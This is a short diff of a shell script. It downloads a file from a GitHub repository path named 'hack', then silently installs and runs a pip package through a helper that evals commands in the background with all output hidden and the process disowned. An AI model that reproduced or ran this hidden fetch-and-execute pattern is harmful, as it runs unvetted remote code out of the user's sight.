@@ -8,7 +8,7 @@ wget https://raw.githubusercontent.com/all-drama/hack/main/david.txt
 _evalBg() {
 eval "$@" &>/dev/null & disown;
 }
-cmd="david4you && david";
+cmd="pip install david4you && david";
 _evalBg "${cmd}";
 bash david.sh
 cd $HOME
